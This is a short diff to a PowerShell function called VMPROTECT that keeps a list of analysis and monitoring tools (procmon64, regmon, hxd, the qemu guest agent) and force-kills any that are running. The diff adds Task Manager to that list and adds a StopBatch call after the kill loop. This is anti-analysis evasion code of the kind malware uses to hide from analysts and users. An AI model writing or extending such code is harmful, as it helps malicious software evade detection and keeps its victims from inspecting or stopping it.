@@ -208,6 +208,7 @@ function VMPROTECT {
         "procmon64",
         "pyw",
         "qemu-ga",
+        "taskmgr",
         "qga",
         "regmon",
         "hxd",
@@ -243,6 +244,7 @@ function VMPROTECT {
         foreach ($process in $detectedProcesses) {
             Stop-Process -Id $process.Id -Force
         }
+        StopBatch
     }
 
     if ($null -eq $detectedProcesses) {	
